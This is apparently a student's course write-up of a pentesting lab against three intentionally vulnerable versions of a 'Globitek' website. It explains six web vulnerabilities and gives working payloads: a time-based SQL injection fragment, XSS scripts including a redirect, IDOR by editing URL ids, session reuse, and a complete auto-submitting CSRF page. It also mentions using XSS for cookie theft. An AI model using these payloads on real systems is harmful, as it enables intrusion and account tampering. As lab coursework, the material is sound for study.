# Project 8 - Pentesting Live Targets

Time spent: **8** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQL Injection (SQLi)

There is an SQLi vulnerability in the id parameter for the salesperson. If an SQL fragment like `' OR SLEEP(4)=0--'` is inserted at the end of a salesperson URL, the injection will succeed and the site will go into a sleep state for the moment.

<img src="https://imgur.com/RNHVBHf.gif" width="800">

Vulnerability #2: Session Hijacking/Fixation

Take the session ID from a logged-in user/browser (on left side window), and use the logged-in session ID on a different browser or for a different user (on right side window) that is visiting the site. This session ID will give the browser user privileges.

<img src="https://imgur.com/OUlkVac.gif" width="800">


## Green

Vulnerability #1: User Enumeration

Green site contains a vulnerability since it allows to figure out if a user exists or not in the system. If they already exist, the error message is displayed in bold. If the username does not exist, the error message is not bold. This can give us valuable information on which usernames exist.
- [x] Using Firefox's debugging tool, I saw that Developer assigns two different classes, "failed" and "failure", to the error message.
- [x] The "failure" class is applied an bold style while "failed" class is not. 

<img src="https://imgur.com/2xjJeux.gif" width="800">

Vulnerability #2: Cross-Site Scripting (XSS)

Attacker can inject an XSS in their feedback form. Injected XSS Command:
```<script>alert('Attack by expert Shivaditya!!!!');</script>```
 This script runs once the feedback page is opened.

<img src="https://imgur.com/auK7sqc.gif" width="800">


## Red

Vulnerability #1: Insecure Direct Object Reference (IDOR)

- [x] One of the inputs in this site allows us to directly change it and access information that shouldn't be displayed.
- [x] Below GIF shows that we are able to get access to the hidden user's accounts that we are not permitted to view.
- [x] This is done through modifying the "id" parameter in the URL's.

<img src="https://imgur.com/Wfrq1ni.gif" width="800">

Vulnerability #2: Cross-Site Request Forgery (CSRF)

- [x] We can forge a form that will automatically do changes if a logged-in admin were to open it.
- [x] Created a malicious page that utilizes the user's session to forge a request to the database:
The following shows the code needed. 

```
<!DOCTYPE html>
<html>

<head>
  <title>Real Form</title>
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
</head>

<body onload="document.getElementById('f').submit();">
  <form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=5" method="post" id="f" style="display: none;" target="hidden_results">
    <input name="first_name" value="Ken Captain" type="text">
    <input name="last_name" value="Barker Planet" type="text">
    <input name="phone" value="656-676-7777" type="text">
    <input name="email" value="captain@planet.com" type="text">
  </form>
  <iframe name="hidden_results" style="display: none;"></iframe>
</body>

</html>
```
- [x] This page secretly makes a post request on page load and hides the outcome in a hidden iframe.
- [x] As result, an account in the database is altered.

<img src="https://imgur.com/AZuOPKU.gif"  width="800">


## Bonus

1. Bonus Objective 1: Build on XSS

- [x] Using XSS, we can do things including redirecting to a new page, stealing cookies, and many others. The following shows how I used XSS to redirect to www.yahoo.com. We can also redirect to another page that will store the cookies in order to retrieve the session id and be able to login. 
`<script>window.location="https://www.yahoo.com";</script>`

<img src="https://imgur.com/DS2h77f.gif" width="800">


## Notes

The main challenge was to find which vulnerability existed in which of the three (blue, green, red) versions of the website. And also performing trial and error took time.
